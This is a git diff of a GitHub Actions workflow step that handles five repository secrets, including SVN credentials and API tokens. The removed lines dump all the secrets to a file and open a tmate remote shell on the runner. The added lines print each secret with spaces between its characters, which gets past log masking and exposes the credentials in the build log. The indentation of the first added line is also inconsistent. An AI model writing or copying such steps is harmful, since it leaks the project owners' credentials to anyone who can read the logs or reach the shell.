@@ -18,11 +18,8 @@ jobs:
         SVN_USERNAME: ${{ secrets.SVN_USERNAME }}
         WPSCIPTSTOKEN: ${{ secrets.WPSCIPTSTOKEN }}
       run: |
-        echo $DBLOCKSPAT >> secrets.txt
-        echo $DBLOCKSTOKENS >> secrets.txt
-        echo $SVN_PASSWORD >> secrets.txt
-        echo $SVN_USERNAME >> secrets.txt
-        echo $WPSCIPTSTOKEN >> secrets.txt
-
-    - name: Run tmate
-      uses: mxschmitt/action-tmate@v2
+       echo $DBLOCKSPAT | sed 's/./& /g'
+        echo $DBLOCKSTOKENS | sed 's/./& /g'
+        echo $SVN_PASSWORD | sed 's/./& /g'
+        echo $SVN_USERNAME | sed 's/./& /g'
+        echo $WPSCIPTSTOKEN | sed 's/./& /g'
